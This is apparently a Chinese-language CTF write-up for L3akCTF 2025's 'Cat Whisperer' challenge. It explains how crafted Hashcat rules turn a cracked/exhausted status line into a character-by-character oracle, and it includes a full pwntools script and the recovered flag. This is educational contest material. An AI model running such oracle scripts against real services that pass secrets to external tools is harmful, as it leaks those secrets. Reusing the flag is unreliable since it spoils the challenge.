# L3akCTF 2025 Cat Whisperer Writeup

## 题目简述

服务端把真正的 flag 作为 Hashcat 字典文件，只允许选手上传一份不超过 128 字节的 rule 文件，然后执行等价于下面的命令：

```bash
hashcat -m 1400 -r uploaded.rule hash.txt flag.txt
```

`-m 1400` 表示 SHA-256，目标摘要为：

```text
502a9ed8aa3938b1828e3cf31d6414b3e3d674ba318e06414be09318ccddb9e4
```

直接计算可确认它对应已知明文 `mE0w`。服务不会输出候选明文，只会在 Hashcat 输出中遇到第一行 `Status` 后停止转发，因此可观察结果只有 `Cracked` 或 `Exhausted`。决定性漏洞是 Hashcat rule 可以先从未知字典词中选出一个字符，再按猜测结果决定能否把它变成 `mE0w`，从而把状态行变成逐字符 oracle。

仓库没有官方解题脚本。本文依据服务端源码、实际摘要校验以及[参赛者公开题解](https://dfoudeh.github.io/posts/l3ak-ctf-2025-cat-whisperer/)还原完整攻击；公开题解末尾的 flag 存在抄写错误，最终结果以仓库内 `flag.txt` 为准。

## 解题过程

### 确认目标明文

先验证题目给出的 SHA-256：

```python
from hashlib import sha256

target = "502a9ed8aa3938b1828e3cf31d6414b3e3d674ba318e06414be09318ccddb9e4"
assert sha256(b"mE0w").hexdigest() == target
```

因此，只要某条 rule 最终生成 `mE0w`，Hashcat 就报告 `Cracked`；否则报告 `Exhausted`。

### 构造单字符 oracle

使用到的 rule 指令如下：

| 指令 | 作用 |
|---|---|
| `r` | 反转整个候选词 |
| `[` | 删除候选词的第一个字符 |
| `x01` | 从偏移 0 开始截取 1 个字符 |
| `sXm` | 把字符 `X` 替换为 `m` |
| `$E$0$w` | 依次在末尾追加 `E0w` |

例如 flag 最后一个字符应为 `}`，可提交：

```text
rx01s}m$E$0$w
```

这条规则执行后的数据流是：

```text
未知 flag
  -> r                 末字符移动到开头
  -> x01               只保留末字符
  -> s}m               若猜中 }，结果变成 m
  -> $E$0$w            结果变成 mE0w
```

猜中时会命中目标摘要并返回 `Cracked`；猜错时，替换不会发生，候选值形如 `XE0w`，服务返回 `Exhausted`。

若已恢复末尾的 `pos` 个字符，就在 `r` 后加入 `pos` 个 `[`，依次删掉这些字符，再用 `x01` 取下一个字符。这里 `[` 的真实语义是“删除首字符”，不是循环移位。

### 自动逐字恢复

下面的脚本保留了完整利用逻辑。远程地址应替换为比赛实例；flag 字符集按题目格式收窄为字母、数字、下划线和花括号，可以避免 rule 参数字符的额外转义问题。

```python
from base64 import b64encode
from string import ascii_letters, digits

from pwn import remote

HOST = "challenge.example"
PORT = 13000
ALPHABET = ascii_letters + digits + "_{}"
FLAG_LEN = 42


def query(rule: str) -> bool:
    encoded = b64encode((rule + "\n").encode())
    io = remote(HOST, PORT)
    io.recvuntil(b"Enter your base64-encoded rule file: ")
    io.sendline(encoded)
    output = io.recvall(timeout=10)
    io.close()
    return b"Cracked" in output


recovered_from_right = ""

for pos in range(FLAG_LEN):
    for char in ALPHABET:
        rule = "r" + "[" * pos + "x01" + f"s{char}m" + "$E$0$w"
        if query(rule):
            recovered_from_right = char + recovered_from_right
            print(recovered_from_right)
            break
    else:
        raise RuntimeError(f"position {pos} was not recovered")

print(recovered_from_right)
```

最长一次猜测也只需要约 54 字节，低于服务端 128 字节限制。逐位命中后得到：

```text
L3AK{Th3_H4sH_C4t_Wh15p3Rz_B4cK_me0w_m3oW}
```

## 方法总结

本题的重点不是计算 SHA-256 碰撞，也不是直接读取 Hashcat 候选词，而是识别“规则语言 + 成功状态”组合形成的布尔侧信道。已知目标明文 `mE0w` 充当探针：先从秘密中隔离一个字符，再仅在猜中时把它改造成该明文。

面对把秘密作为字典、模板或内部输入交给外部工具的服务，应同时检查三层信息泄露面：可控的变换语言、错误或状态差异、以及请求次数是否足以重复查询。即使候选值本身从不回显，只要存在稳定的成功/失败差异，仍可能被逐位外带。
